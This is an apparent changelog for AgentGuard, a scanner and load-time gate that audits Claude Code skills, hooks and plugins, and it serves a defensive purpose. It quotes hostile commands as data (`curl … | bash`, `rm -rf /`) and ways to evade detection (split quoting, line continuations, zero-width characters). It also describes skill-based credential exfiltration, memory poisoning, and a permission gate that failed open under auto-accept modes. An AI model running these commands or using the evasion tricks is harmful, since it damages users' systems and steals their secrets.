  `~/.claude/install.sh` (`curl … | bash` + `rm -rf /`) and `~/.claude/skills/x/run.sh` with no
  `SKILL.md` scanned to **100/100, "✅ No risk findings", exit 0**. `check` had this fixed a while
  ago; `scan` had not, so the same bug was half fixed — and the half still broken is the command
  everyone runs first. This was the only gap in the tool that violated invariant #5 by staying
  quiet about itself.

  What to read is decided by whether the agent has a LOAD PATH in, and two earlier answers were
  wrong in ways worth keeping written down:
  1. *A list of runtime-state names to skip* — written from memory, and a real `~/.claude` showed
     it had missed most of them (`cache/`, `debug/`, `downloads/`, `paste-cache/`, `backups/`).
     A name list is a promise to track someone else's layout forever.
  2. *"Read anything containing an executable-looking file"* — worse: `shell-snapshots/` and
     `file-history/` are full of shell scripts because they are snapshots OF the user's code, so
     shape cannot separate authored content from machine-generated state made of content.

  Final split: load namespaces (`skills/`, `agents/`, `commands/`) are read even with the manifest
  missing; loose top-level FILES are read when they look like code (extension or shebang) or
  instructions (`.md`); top-level DIRECTORIES are never read, on the same argument `ExcludeFromHash`
  already rests on — an unreferenced tree is inert, and anything that DOES point into one is
  followed already. Everything unread is named in one `COV-000`.

  Both wrong versions also moved the headline score UP on a real machine (86 → 97, then 93):
  every unowned entry became a 100-scoring artifact and the environment score is an AVERAGE, so
  scanning more diluted the findings that were already there. A note is not an artifact, so the
  final version leaves the number where it was.
- **A.1, the lexical half — rules now match what an INTERPRETER would run** (`detect/logical.go`).
  Every rule read one physical line, so anything the interpreter folds before running defeated
  the pattern while changing nothing about the payload. Two of these were in the adversarial
  corpus, asserted inverted; both rows are now `wantCaught`:
  - a **line continuation** (`curl … \` newline `| bash`) — joined before matching, and the
    finding cites the line where the command STARTS, not the fragment it ends on;
  - an **invisible character** inside a command name (zero-width space, bidi override) — stripped;
  - **quoting used to split a word** (`cu""rl`, `cur'l'`, `c\url`) — folded. A quoted section that
    BEGINS a word is copied through untouched: that is an ordinary argument, and folding its
    quotes would splice a string's contents into the command line, which is how a normalizer
    starts inventing findings that are not in the file.

  Two views come out of the pass and they are deliberately different strings: rules match the
  normalized line; **evidence quotes the raw one**. A report that prints `curl …` where the file
  says `cu""rl …` has told the operator the wrong thing about their own machine. And because
  normalization only ever deletes, rules run on raw FIRST and consult the normalized view only
  if that missed — otherwise `INJ-004`, whose entire job is to report invisible characters,
  would be silenced by the pass that strips them.

  It is a lexer, not a syntax tree; see A.1 above for what a real parser would still buy. The
  first version panicked on a line ending in a quote — found by running the tool on a real
  `~/.claude`, not by the table test — so the pass now has fuzz targets asserting it never
  panics and never grows its input.
- **A lone finding's evidence is no longer collapsed to one line** (`report.Aggregate`). One
  line per finding is right when a rule hit twelve files, but a structural finding carries its
  evidence as legs of one argument — read here, encoded there, sent there — and showing only
  the first turned a three-part claim into an assertion.

Reporting and taxonomy — output surfaces, no new detection authority:
- **A.8 SARIF 2.1.0 output** (`--sarif`, on `scan` and `check`) — this was already a gate, but a gate
  that fails with a wall of terminal text sends the reader hunting. Every finding already carried file,
  line and a redacted snippet; SARIF is where that data becomes an inline annotation on the diff.
  Three properties are load-bearing and each has a test: judge findings and advisory dimensions arrive
  as `note` however severe they looked (they do not move `overall`, and red annotations beside
  deterministic ones would import that uncertainty into a surface that reads as authoritative);
  fingerprints EXCLUDE the line number, so inserting a line above a finding does not reopen a
  dismissed alert; and output is byte-stable across runs, the determinism `overall` is held to applied
  to the report. Snippets are safe to publish only because redaction happens when a finding is BUILT,
  not when it is printed — SARIF lands in CI artifacts and third-party UIs, so that ordering matters
  more here than anywhere else.
- **A.9 rules mapped to OWASP Agentic (2026) ASI-01…ASI-10** (`detect/owasp.go`) — a second lens, not
  a new basis: the ten scoring dimensions are what `overall` is made of and they did not move. The two
  taxonomies cut differently (ours by technical behaviour, OWASP's by threat), so the mapping is
  many-to-many with real holes, and the holes are printed rather than papered over — 7 of 10 categories
  have rules, and the report names ASI-08/09/10 as ones this tool is SILENT about, because they
  describe runtime behaviour across agents. Same discipline COV-000 applies to files.
  Two things fell out of doing it per-RULE instead of per-dimension. Location refines category: an
  injected line in a skill is ASI-01, the same line in auto memory is ASI-01 **and ASI-06**, because
  Claude wrote that file itself and reloads it every session — memory poisoning was a category we
  already covered and had never named. And SARIF rule metadata must carry the rule's OWN categories,
  since it is created on first sight and folding the artifact kind in made classification depend on
  walk order. Titles are still unverified against the official PDF (issues/014).
- **C.8 release pipeline, and deliberately no one-line installer** — a version tag builds and
  publishes the five raw static binaries plus `SHA256SUMS.txt` (`.github/workflows/release.yml`), so
  the README's install is download + verify + `chmod` rather than "clone it and have Go installed".
  The checksum file is produced by `make dist`, NOT by the workflow, so what CI publishes is
  byte-for-byte what a maintainer gets locally. The release job re-runs `vet` + `go test -race`
  because a tag can point at any commit, and it fails if the stamped version does not match the tag —
  `fetch-depth: 0` alone is a hope, that check is a proof. `workflow_dispatch` builds and uploads the
  artifacts WITHOUT cutting a tag, because a tag is permanent and a release is public, so the dry run
  has to live somewhere other than "push a tag and see". Publishing uses the first-party `gh` CLI with
  `--verify-tag` rather than a third-party action: an action granted `contents: write` on a security
  tool's release is a supply-chain dependency that buys nothing here.
  **There is no `curl … | sh` line, on purpose.** This tool reports `curl` piped to a shell as
  EXEC-001, high, in anybody else's repository — publishing one here would ask the user to do the exact
  thing it will warn them about, on the machine it is meant to protect. That is why the checksums are
  not decoration: a verify step needs something to verify against. `hack/github-action.yml` also gained
  the SARIF upload, with `continue-on-error` on the scan step so the annotations still land on the run
  that failed the gate — otherwise the run you most want annotated is the one that produces nothing.
- **C.9 visual evidence** — an HTML-report screenshot and the matching terminal output at the top of
  the README, from one scan of a representative environment (four skills, two with real problems).
  Building that environment immediately earned its keep: it exposed `hooks` being reported as "not
  read" on a run where a hook command had already been audited and its script followed — the same
  overclaimed-gap bug as `rules`, missed because the drift test's fixture had no `hooks/`. The fixture
  now mirrors a real root. A hand-maintained list needs a fixture built from what a machine actually
  contains, not from the layouts one happens to remember.
- **B.6b restore preview, and a manifest hash chain** — two answers to one gap that the 013 audit
  missed: the identity check compares trash content against a hash read FROM THE MANIFEST, so changing
  BOTH passes. The circle cannot be broken inside one file, and the attack buys concealment rather than
  privilege (anything able to write .aguard-trash/ could already write skills/), so the fix targets the
  concealment: every restore now prints what it is putting back and RUNS THE RULES over it, because the
  measured payload sat in SKILL.md's body where a file listing and a three-line head both missed it.
  The chain makes a deleted or edited middle row detectable instead of silent — which matters most in
  the non-adversarial case, since emptying the record used to leave a skill in the trash with `--undo`
  reporting "nothing outstanding". Its limits are measured and asserted INVERTED
  (`TestChain_CannotDetectEndOfFileTampering`): editing the LAST row and emptying the file are both
  invisible, because an anchor inside the data it protects cannot bind its own end. So the claim is
  **integrity, not tamper-proofing**, and the docs say integrity. A break WARNS and does not block —
  the file is already out of place, so refusing would guarantee the loss rather than prevent it — and
  pre-chain rows stay restorable, because making an upgrade the cause of an unrecoverable batch would
  be its own data loss. See issues/015, including why every external-anchor option costs a property
  this tool is chosen for; D.12 would supply one for free, and would let those inverted assertions flip.
- **B.6a the quarantine address is measured, not assumed** — `docs/internals/measurement-startup-loading.md`
  records a run against Claude Code 2.1.229 with an isolated `CLAUDE_CONFIG_DIR`, the outgoing
  request body captured, and `strace` alongside `--debug`. `<config-root>/.aguard-trash` loads
  nothing, so tier A1's premise holds. What the measurement changed: `rules/`, `agents/` and
  `commands/` recurse and do NOT skip hidden directories, so a `--root` pointed inside one of
  them would park quarantined content back in the loaded set — `clean` now refuses that address
  in dry-run and apply alike. Two beliefs were also corrected: a dot-prefixed directory under
  `skills/` IS a live skill (the debug line about dot-prefixed dirs is about *plugins*), and
  `workflows/` bodies do NOT load at startup, so they moved off the report's `Auto-loaded:` line.

`check` is a gate, so the ways it could report clean without having read anything got fixed:

- **Layout routing** — a directory with no `SKILL.md` used to fall through to the root
  collectors, which look only for known sub-layouts and therefore read NOTHING in a bare
  directory: a malicious `install.sh` at its top level scored 100/100 and exited 0. `check` now
  routes single file → `SKILL.md` → plugin manifest → root → whole-tree read.
- **An unreadable target is an error (exit 2)**, not an empty result. `check <typo>` used to
  print 100/100 and exit 0; "I could not audit this" and "this is fine" are the two answers a
  gate exists to keep apart.
- **No baseline auto-discovery** — `check`'s target IS the artifact under audit, so a
  `.aguardignore` shipped inside it is written by whoever wrote the artifact. One naming its
  own rule IDs used to suppress itself to 100/100 and exit 0. Only an explicit `--ignore` now
  applies; `scan`/`clean` are unchanged, since their root is the operator's own environment.
- **Permission grants that name a local script** (`Bash(./scripts/deploy.sh *)`) have that
  script read and scanned. permcheck judges a grant's SHAPE from its text and never opens a
  file, so this half had no owner. Same containment as hooks; unfollowable references produce
  a `COV-000`.
- **Redaction happens before truncation** (`detect.redactClip`). Snippets are length-capped,
  and clipping first cut credentials below the entropy pass's 24-character minimum, leaking
  the leading 12–23 characters of a token in the clear.
- **Skips are no longer silent.** Files whose extension is unknown but whose content sniffs as
  text, and generated/vendored directories, each produce a `COV-000`. An artifact that points
  the agent INTO an excluded directory is `SUP-004` (dimension 5, medium, scores and gates) —
  the readable half steering the agent at the half a name made unreadable.
- **An adversarial corpus** (`cmd/aguard/adversarial_test.go`) written to evade this scanner
  rather than exercise it. Confirmed gaps are asserted INVERTED, so closing one fails the test
  instead of passing quietly — see "Known limitations".
- **A mistyped `--root` no longer scores 100/100** (`collect.ValidateRoot`). Every collector
  reads ENOENT as "this layout is absent", which is right per-collector and catastrophic for
  the root itself: it made all of them absent at once, so `scan --root ~/.clade` printed
  `Risk score 100/100 (Low)` + `✅ No risk findings` + exit 0 for a directory that never
  existed. `check` already treated an unreadable target as exit 2; `scan`/`clean` now do too,
  and a root that exists but collects nothing carries a `COV-000` saying the inventory was
  empty rather than clean (invariant #5). Pointing at a project's `.claude` instead of the
  user-level one is the likeliest first-run mistake, and the old failure mode rewarded it with
  the tool's most confident possible output.

Load-time gate (**was B.7, "install-time gate"** — the name was wrong and the correction is
the design):

- **`aguard hook`** registers as a Claude Code hook and audits a skill **before an agent loads
  it**. Claude Code exposes nine hook events and **none fires on installation**, so the entry
  as written had no mounting point — and would not have been complete with one, since a skill
  also arrives by `git clone`, by `cp`, and by hand outside any session.

  Loading is the boundary that can be held, and it is the one that matters: a skill on disk is
  inert until an agent reads it into context. That is the same argument `collect/unowned.go`
  already rests on — what makes something dangerous is whether the agent has a load path in,
  not whether the bytes are present. So the gate does not stop a download; it stops the
  artifact from speaking.
- **Approvals are keyed by canonical hash**, not by name or path. The tree hash was built to be
  stable across machines and checkouts (it is the reputation key), which makes it exactly the
  right key here: an update, a re-install or one edited character produces a different hash and
  the gate asks again by itself. No expiry to tune, no cache to invalidate. A rename cannot
  inherit an approval, which is the whole point.
- **Two halves, because one of them cannot cover the environment.** `PreToolUse[Skill]` is the
  only place that can actually stop something and put a question in front of a human. But a
  plugin's hooks and MCP servers are live from the first turn — there is no load event to
  intercept — so `SessionStart` audits the whole root and reports what the gate will never get
  a chance to block. Shipping only the interception half would have left operators believing
  the whole environment was gated when only skills were, and the session-start message says so
  in as many words.
- **An approval can only cover bytes that were shown.** `PreToolUse` parks the verdict against
  the `tool_use_id`; `PostToolUse` re-reads the target and promotes it only if the hash still
  matches. Recording whatever is on disk after the load would let a target that changed between
  the prompt and the load be certified by an answer about different content.
- **An `ask` nobody will see is a yes, so it becomes a `deny`.** Found on a real machine after
  the gate shipped: a skill scoring 51/100 with a complete credential-exfiltration chain
  returned `ask`, the session's permission mode (`auto`) accepted it automatically, the skill
  loaded, and NOTHING was displayed. The gate had failed open *in silence*, which is the one
  thing this package does not allow itself. It now reads the event's `permission_mode` and
  refuses instead under any mode that auto-answers (`auto`, `acceptEdits`, `bypassPermissions`,
  `dontAsk`), naming the mode in the reason so the operator knows why they were not asked.
  `default` and `plan` are untouched, and an unrecognised mode does not escalate — turning
  every future Claude Code release into a wall of denials is its own way of getting uninstalled.
- **`aguard hook status`** answers "is it actually on?". The registration bakes in an absolute
  path, and a path stops resolving when a binary moves or a build directory is cleaned; the
  editor then runs a command that is not there, every skill loads unaudited, and the silence is
  indistinguishable from a clean environment. Three states — active, not installed, registered
  but dead — and exit 1 for the last two. **`scan` reports the dead case too** (`GATE-001`,
  dimension 0): nobody runs a status command on a schedule, while `scan` is the command people
  already run, so leaving it to a question you have to think of asking would recreate exactly
  the silence the gate exists to prevent. It does not score — a dead hook makes the REPORT less
  trustworthy, it does not make any artifact more dangerous, and inflating it into a scored
  finding would move a number that has to keep meaning "what the scan found in your artifacts".
- **The clean-path notice travels in `systemMessage`, which the VS Code extension does not
  render.** Blocking is unaffected. It was deliberately NOT rerouted through a non-zero exit
  and stderr: that renders "everything is fine" as an error, which is worse than silence.
  `hook status` and `approvals` are the channels for that question instead.
- **It fails OPEN and LOUD, deliberately inverting the tool's usual rule.** An unresolvable
  skill name, a scanner error, an empty collection or an unwritable store all allow the load
  and emit `GATE-000` naming what went unaudited. Fail-closed is right inside the scanner
  (invariant #2); here it would mean an editor that cannot load skills whenever this tool has a
  bug, and a gate that does that is removed within the day. The one exception runs the other
  way: a corrupt approvals store reads as EMPTY, because forgetting approvals costs prompts
  while honouring a file we cannot parse costs a silent allow.
- **Nothing attacker-written reaches the model unfenced.** Artifact names and paths are written
  by whoever wrote the artifact, so the session-start summary enters the agent's context behind
  a per-call nonce barrier (the device `internal/judge` already uses), and evidence SNIPPETS are
  omitted from every model-facing message — `aguard check` prints those for a human instead.
  A security message that carries lines of the audited file into a model's context is the exact
  shape this tool refuses to take.
- **The gate uses the same deterministic path `check` uses** — no judge, no network, nothing
  executed. `score.Deterministic` is called, not re-derived, so the gate cannot drift from the
  number `--fail-on` acts on. A prompt that means something different depending on whether an
  endpoint answered is not a gate.
- **`aguard hook install` merges into `settings.json`** rather than replacing it, backs it up
  first, and is idempotent. One command serves all three events (the runner dispatches on
  `hook_event_name`), so no shell pipeline lands in the settings file — which also keeps the
  gate's own installation from tripping `HOOK-001`. Verified: a root with the gate registered
  still scans 100/100 with no self-report.

Distribution and packaging — nothing about detection, everything about whether anyone can run it:
- **npm distribution** — five packages: one launcher plus four platform packages carrying a
  static binary each, chosen by `os`/`cpu`. No install script anywhere, deliberately: fetching
  a binary in `postinstall` is the shape this engine reports in other people's repositories.
  The launcher never exits 0 without a verdict; a signal exits `128+n`, and routine signals
  (Ctrl-C, closed pipe) print nothing, because the bare binary prints nothing for those.
- **Claude Code plugin and marketplace entry** — `plugin/` ships three skills and six slash
  commands. It carries none of this repository's documentation, and that is load-bearing: the
  docs quote every attack pattern the engine detects, so shipping them would make every user's
  scan report AgentGuard itself as high-risk. Enforced in CI, not reviewed.
- **Sandbox disclosure** — a scan running in a throwaway cloud container is scanning that
  container, not the user's machine, and would otherwise come back ~100 and be read as a clean
  bill of health. Detected from several independent signals and announced in a banner inside
  the report file itself, so it survives being forwarded on its own.
- **Gate uninstall removes every copy and only ours**, and backups use two slots so the original
  `settings.json` is never overwritten by a second run.
- **Organisation renamed to `basdotio`** — module path, every URL, and the marketplace entry.
  The module path has three places that must agree or the build simply does not compile.

Versions are not listed here for the same reason counts are not: `git tag` and the Releases
page cannot go stale, and a list in this file can.
